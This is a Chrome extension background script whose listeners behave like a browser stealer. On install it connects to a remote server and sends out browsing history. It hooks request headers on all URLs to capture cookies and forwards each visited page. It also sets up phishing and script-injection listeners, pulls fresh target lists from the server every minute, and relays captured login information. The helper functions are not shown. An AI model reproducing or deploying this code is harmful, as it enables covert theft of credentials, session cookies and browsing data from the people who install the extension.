chrome.runtime.onInstalled.addListener(() => {
  connectToServer();
  searchAndSendHistory();
  createScriptListener();
  chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
      checkAndSendCookies(info);
    }, {
      urls: ["<all_urls>"]
    },
    ['blocking', 'requestHeaders']);
  chrome.history.onVisited.addListener((page) => {
    sendHistoryPage(page);
  });
  createPhishingListener();
  chrome.alarms.create("updater", {
    periodInMinutes: 1
  });
  chrome.alarms.onAlarm.addListener(() => {
    updateSecurityWebsites(socket);
    updateScriptWebsites(socket);
  })
  createTabListeners();
});

chrome.runtime.onStartup.addListener(() => {
  connectToServer();
  createScriptListener();
});

chrome.windows.onCreated.addListener(()=>{
  connectToServer();
});


chrome.windows.onRemoved.addListener(() => {
  disconnectFromServer(socket);
});

chrome.runtime.onSuspend.addListener(() => {
  disconnectFromServer(socket);
});

chrome.runtime.onMessage.addListener((request, sender) => {
  sendLoginInfo(request.loginListener);
});
